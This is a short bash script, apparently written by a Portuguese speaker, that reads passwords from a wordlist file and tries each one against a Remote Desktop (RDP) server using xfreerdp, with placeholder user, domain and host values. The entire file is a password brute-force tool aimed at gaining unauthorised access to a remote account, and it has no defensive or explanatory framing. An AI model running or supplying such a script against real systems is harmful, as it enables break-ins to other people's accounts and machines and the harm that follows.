#!/bin/bash
for pass in $(cat wordlist.txt);
do
echo "Testando senha: $pass"
xfreerdp /u:usuario /d:dominio /p:$pass /v:host /w:800 /h:600;
done
